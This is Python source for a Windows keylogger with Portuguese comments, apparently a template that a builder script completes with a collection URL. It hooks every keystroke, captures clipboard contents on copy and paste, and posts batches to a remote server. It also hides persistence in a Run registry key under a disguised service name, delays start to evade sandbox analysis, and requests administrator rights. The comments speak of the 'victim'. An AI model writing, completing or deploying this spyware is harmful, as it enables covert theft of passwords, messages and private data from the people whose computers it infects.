import pyWinhook as pyHook
import pythoncom
import requests
import threading
import ctypes
import sys
import time
import os
import winreg
import win32clipboard

# ==========================================================
# CONFIGURAÇÃO: O main.py substitui a marcação abaixo
# ==========================================================
URL_BASE = "REPLACE_ME_URL"
URL = f"{URL_BASE}/captura"

buffer = ""


def persistir():
    """Cria uma chave de arranque no Registro do Windows para iniciar com o sistema."""
    try:
        # Nome discreto para o processo no Registro
        app_name = "DuckGreenHostSvc"
        path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except:
        pass


def get_clipboard():
    """Captura dados da Área de Transferência (Ctrl+V)."""
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return f"\n[ÁREA DE TRANSFERÊNCIA: {data}]\n"
    except:
        return ""


def enviar_batch(conteudo):
    """Envia o conteúdo acumulado para o servidor remoto via POST."""
    try:
        requests.post(URL, json={"tecla": conteudo, "processo": "WIN_ALVO_PRO"}, timeout=5)
    except:
        pass


def ao_digitar(event):
    """Monitor de eventos do teclado."""
    global buffer
    tecla = event.Key

    # Se detectar atalhos de copiar/colar, tenta ler o clipboard
    if event.Key in ["V", "C"]:
        tecla += get_clipboard()

    buffer += f" [{tecla}] "

    # Envia quando o buffer estiver cheio (45 caracteres) para reduzir tráfego
    if len(buffer) > 45:
        # Usa threading para o envio não travar o teclado da vítima
        threading.Thread(target=enviar_batch, args=(buffer,)).start()
        buffer = ""
    return True


# --- INICIALIZAÇÃO SILENCIOSA ---

# 1. Delay inicial para enganar sistemas de análise automática
time.sleep(10)

# 2. Solicitar Privilégios de Administrador (UAC)
if not ctypes.windll.shell32.IsUserAnAdmin():
    # Relança o programa pedindo permissão de admin
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# 3. Ativar a Persistência no Registro
persistir()

# 4. Iniciar o Hook (Gancho) do Teclado
hm = pyHook.HookManager()
hm.KeyDown = ao_digitar
hm.HookKeyboard()

# 5. Mantém o processo vivo capturando mensagens do Windows
pythoncom.PumpMessages()